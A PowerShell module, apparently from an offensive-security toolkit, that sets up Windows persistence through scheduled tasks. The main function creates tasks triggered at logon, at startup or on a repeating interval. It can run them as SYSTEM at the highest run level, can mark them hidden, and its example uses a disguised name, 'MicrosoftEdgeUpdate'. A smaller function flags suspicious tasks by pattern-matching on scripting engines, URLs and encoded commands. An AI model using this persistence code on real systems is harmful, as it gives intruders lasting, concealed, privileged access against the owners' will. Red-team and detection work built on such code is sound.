<#
.SYNOPSIS
    Establish persistence via Windows Scheduled Tasks

.DESCRIPTION
    Creates scheduled tasks for persistence with various trigger options:
    - User logon
    - System startup
    - Periodic execution
    - Specific time

.AUTHOR
    Anubhav Gain (@anubhavg-icpl)

.PARAMETER Command
    Command or path to execute

.PARAMETER TaskName
    Name for the scheduled task

.PARAMETER TriggerType
    When to trigger the task

.PARAMETER Interval
    Interval for recurring tasks (in minutes)

.EXAMPLE
    Invoke-ScheduledTaskPersistence -Command "powershell.exe -File C:\update.ps1" -TaskName "MicrosoftEdgeUpdate" -TriggerType AtLogon
    Invoke-ScheduledTaskPersistence -TaskName "MicrosoftEdgeUpdate" -Remove
#>

function Invoke-ScheduledTaskPersistence {
    [CmdletBinding()]
    param(
        [Parameter(ParameterSetName = 'Add')]
        [string]$Command,

        [Parameter(Mandatory)]
        [string]$TaskName,

        [Parameter(ParameterSetName = 'Add')]
        [ValidateSet('AtLogon', 'AtStartup', 'Daily', 'Hourly', 'OnIdle')]
        [string]$TriggerType = 'AtLogon',

        [Parameter(ParameterSetName = 'Add')]
        [int]$IntervalMinutes = 60,

        [Parameter(ParameterSetName = 'Add')]
        [switch]$AsSystem,

        [Parameter(ParameterSetName = 'Add')]
        [switch]$Hidden,

        [Parameter(ParameterSetName = 'Remove')]
        [switch]$Remove
    )

    if ($Remove) {
        Write-Host "[*] Removing scheduled task: $TaskName" -ForegroundColor Yellow

        try {
            Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction Stop
            Write-Host "[+] Task removed successfully" -ForegroundColor Green
        }
        catch {
            # Try schtasks as fallback
            schtasks /delete /tn $TaskName /F 2>$null
            if ($LASTEXITCODE -eq 0) {
                Write-Host "[+] Task removed via schtasks" -ForegroundColor Green
            }
            else {
                Write-Error "Failed to remove task: $_"
            }
        }
        return
    }

    if (-not $Command) {
        Write-Error "Command is required when adding persistence"
        return
    }

    Write-Host @"

============================================================
  SCHEDULED TASK PERSISTENCE
============================================================
  Task: $TaskName
  Trigger: $TriggerType
  Command: $Command
  Run As: $(if ($AsSystem) { 'SYSTEM' } else { $env:USERNAME })
  Hidden: $Hidden
============================================================

"@ -ForegroundColor Cyan

    # Parse command into executable and arguments
    if ($Command -match '^"?([^"\s]+)"?\s*(.*)$') {
        $executable = $Matches[1]
        $arguments = $Matches[2]
    }
    else {
        $executable = $Command
        $arguments = ""
    }

    try {
        # Create action
        $action = New-ScheduledTaskAction -Execute $executable -Argument $arguments

        # Create trigger based on type
        $trigger = switch ($TriggerType) {
            'AtLogon' {
                if ($AsSystem) {
                    New-ScheduledTaskTrigger -AtLogOn
                }
                else {
                    New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
                }
            }
            'AtStartup' {
                New-ScheduledTaskTrigger -AtStartup
            }
            'Daily' {
                New-ScheduledTaskTrigger -Daily -At (Get-Date) -DaysInterval 1
            }
            'Hourly' {
                New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes $IntervalMinutes) -RepetitionDuration ([TimeSpan]::MaxValue)
            }
            'OnIdle' {
                New-ScheduledTaskTrigger -AtStartup  # Will be modified
            }
        }

        # Create principal
        if ($AsSystem) {
            $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        }
        else {
            $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest
        }

        # Create settings
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

        if ($Hidden) {
            $settings.Hidden = $true
        }

        # Register the task
        $task = Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force

        Write-Host "[+] Scheduled task created successfully" -ForegroundColor Green

        Write-Host @"

[*] TASK DETAILS:
    Name: $TaskName
    State: $($task.State)
    Trigger: $TriggerType

[*] VERIFICATION:
    Get-ScheduledTask -TaskName "$TaskName"
    schtasks /query /tn "$TaskName" /v /fo list

[*] REMOVAL:
    Invoke-ScheduledTaskPersistence -TaskName "$TaskName" -Remove
    # Or: schtasks /delete /tn "$TaskName" /f
"@ -ForegroundColor Cyan

        return $task
    }
    catch {
        Write-Error "Failed to create scheduled task: $_"
    }
}

function Get-SuspiciousScheduledTasks {
    <#
    .SYNOPSIS
        Find scheduled tasks that might be persistence mechanisms

    .EXAMPLE
        Get-SuspiciousScheduledTasks
    #>
    [CmdletBinding()]
    param()

    Write-Host "[*] Searching for suspicious scheduled tasks..." -ForegroundColor Yellow

    $tasks = Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object {
        $_.TaskPath -notlike '\Microsoft\*' -and
        $_.State -eq 'Ready'
    }

    $suspicious = @()

    foreach ($task in $tasks) {
        $taskInfo = Get-ScheduledTaskInfo -TaskName $task.TaskName -TaskPath $task.TaskPath -ErrorAction SilentlyContinue

        $actions = $task.Actions | ForEach-Object {
            if ($_.Execute) {
                "$($_.Execute) $($_.Arguments)"
            }
        }

        # Check for suspicious patterns
        $isSuspicious = $false
        $reason = @()

        foreach ($action in $actions) {
            if ($action -match 'powershell|cmd|wscript|cscript|mshta|rundll32') {
                $isSuspicious = $true
                $reason += "Uses scripting engine"
            }
            if ($action -match 'http://|https://|\\\\') {
                $isSuspicious = $true
                $reason += "References network location"
            }
            if ($action -match '-enc|-encoded|-e ') {
                $isSuspicious = $true
                $reason += "Uses encoded commands"
            }
        }

        if ($isSuspicious -or $task.TaskPath -eq '\') {
            $suspicious += [PSCustomObject]@{
                Name        = $task.TaskName
                Path        = $task.TaskPath
                State       = $task.State
                Actions     = $actions -join '; '
                LastRun     = $taskInfo.LastRunTime
                NextRun     = $taskInfo.NextRunTime
                Reason      = $reason -join ', '
            }
        }
    }

    if ($suspicious.Count -gt 0) {
        Write-Host "[!] Found $($suspicious.Count) suspicious tasks:" -ForegroundColor Red
        return $suspicious | Format-List
    }
    else {
        Write-Host "[+] No obviously suspicious tasks found" -ForegroundColor Green
    }
}

# Export functions
Export-ModuleMember -Function Invoke-ScheduledTaskPersistence, Get-SuspiciousScheduledTasks
